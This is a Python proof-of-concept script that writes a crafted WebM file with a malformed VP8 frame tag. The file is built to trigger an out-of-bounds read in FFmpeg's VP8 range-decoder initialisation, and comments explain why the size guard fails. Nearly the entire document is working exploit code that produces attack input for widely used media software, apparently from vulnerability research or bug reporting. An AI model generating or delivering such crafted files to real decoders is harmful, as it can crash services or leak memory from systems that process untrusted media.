#!/usr/bin/env python3
"""
Generate a minimal crafted WebM/VP8 file to trigger OOB read in
ff_vpx_init_range_decoder() (libavcodec/vpx_rac.c lines 42-53).

The frame tag bytes [0x31, 0x00, 0x00] cause:
  - bit0 = 1  → inter frame (no sync-code check)
  - bit4 = 1  → show_frame
  - header_size = AV_RL24([0x31,0x00,0x00]) >> 5 = 49 >> 5 = 1
After consuming the 3-byte frame tag, buf advances by 3 and buf_size = 1.
The guard (header_size > buf_size) → 1 > 1 → false, so it passes.
ff_vpx_init_range_decoder(c, buf, 1) then calls bytestream_get_be24()
which reads 3 bytes from a 1-byte buffer → OOB read (CWE-125).
"""
import struct

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def ebml_size(n):
    """Encode n as an EBML variable-length size integer."""
    if n <= 126:
        return bytes([n | 0x80])
    elif n <= 16382:
        return struct.pack('>H', n | 0x4000)
    elif n <= 2097150:
        v = n | 0x200000
        return bytes([(v >> 16) & 0xFF, (v >> 8) & 0xFF, v & 0xFF])
    else:
        raise ValueError(f"Size {n} too large for this encoder")

def ebml_elem(eid, data):
    """Build an EBML element: ID + vint(size) + data."""
    if isinstance(data, int):
        # encode as minimal big-endian bytes
        if data == 0:
            data = b'\x00'
        else:
            length = (data.bit_length() + 7) // 8
            data = data.to_bytes(length, 'big')
    return eid + ebml_size(len(data)) + data

# ---------------------------------------------------------------------------
# VP8 frame data
# ---------------------------------------------------------------------------
# Frame tag: [0x31, 0x00, 0x00]
#   AV_RL24 = 0x000031 = 49
#   bit0 = 1 → inter/non-keyframe
#   bit4 = 1 → show_frame
#   header_size = 49 >> 5 = 1
# We add one byte of partition data so total VP8 payload = 4 bytes.
# After consuming the 3-byte frame tag, header_size=1 and remaining=1 byte.
# Guard: 1 > 1 → false → passes.
# bytestream_get_be24 reads 3 bytes from a 1-byte region → OOB read.
vp8_data = bytes([0x31, 0x00, 0x00, 0x00])

# ---------------------------------------------------------------------------
# SimpleBlock payload
#   track vint: 0x81 (track 1)
#   timecode:   big-endian int16 = 0
#   flags:      0x00
#   frame data: vp8_data
# ---------------------------------------------------------------------------
simple_block_payload = b'\x81' + struct.pack('>h', 0) + b'\x00' + vp8_data

# ---------------------------------------------------------------------------
# TrackEntry
# ---------------------------------------------------------------------------
pixel_width  = ebml_elem(b'\xB0', 16)   # PixelWidth  = 16
pixel_height = ebml_elem(b'\xBA', 16)   # PixelHeight = 16
video_elem   = ebml_elem(b'\xE0', pixel_width + pixel_height)

track_entry_content = (
    ebml_elem(b'\xD7', 1) +              # TrackNumber = 1
    ebml_elem(b'\x73\xC5', 1) +          # TrackUID    = 1
    ebml_elem(b'\x83', 1) +              # TrackType   = 1 (video)
    ebml_elem(b'\x86', b'V_VP8') +       # CodecID
    video_elem
)
track_entry = ebml_elem(b'\xAE', track_entry_content)
tracks      = ebml_elem(b'\x16\x54\xAE\x6B', track_entry)

# ---------------------------------------------------------------------------
# SegmentInfo
# ---------------------------------------------------------------------------
seg_info_content = (
    ebml_elem(b'\x2A\xD7\xB1', 1000000) +   # TimecodeScale = 1000000
    ebml_elem(b'\x4D\x80', b'poc_muxer') +  # MuxingApp
    ebml_elem(b'\x57\x41', b'poc_muxer')    # WritingApp
)
seg_info = ebml_elem(b'\x15\x49\xA9\x66', seg_info_content)

# ---------------------------------------------------------------------------
# Cluster
# ---------------------------------------------------------------------------
timecode_elem    = ebml_elem(b'\xE7', 0)                          # Timecode = 0
simple_block_elem = ebml_elem(b'\xA3', simple_block_payload)      # SimpleBlock
cluster = ebml_elem(b'\x1F\x43\xB6\x75', timecode_elem + simple_block_elem)

# ---------------------------------------------------------------------------
# Segment (unknown size)
# ---------------------------------------------------------------------------
segment_body = seg_info + tracks + cluster
segment = b'\x18\x53\x80\x67' + b'\x01\xFF\xFF\xFF\xFF\xFF\xFF\xFF' + segment_body

# ---------------------------------------------------------------------------
# EBML Header
# ---------------------------------------------------------------------------
ebml_header_content = (
    ebml_elem(b'\x42\x86', 1) +              # EBMLVersion = 1
    ebml_elem(b'\x42\xF7', 1) +              # EBMLReadVersion = 1
    ebml_elem(b'\x42\xF2', 4) +              # EBMLMaxIDLength = 4
    ebml_elem(b'\x42\xF3', 8) +              # EBMLMaxSizeLength = 8
    ebml_elem(b'\x42\x82', b'webm') +        # DocType = webm
    ebml_elem(b'\x42\x87', 2) +              # DocTypeVersion = 2
    ebml_elem(b'\x42\x85', 2)               # DocTypeReadVersion = 2
)
ebml_header = ebml_elem(b'\x1A\x45\xDF\xA3', ebml_header_content)

# ---------------------------------------------------------------------------
# Write output
# ---------------------------------------------------------------------------
output = ebml_header + segment
with open('vuln_001_input.webm', 'wb') as f:
    f.write(output)

print(f"Written vuln_001_input.webm ({len(output)} bytes)")
print(f"VP8 frame tag: {list(vp8_data[:3])} -> header_size={vp8_data[0] | (vp8_data[1]<<8) | (vp8_data[2]<<16)} >> 5 = {((vp8_data[0] | (vp8_data[1]<<8) | (vp8_data[2]<<16)) >> 5)}")
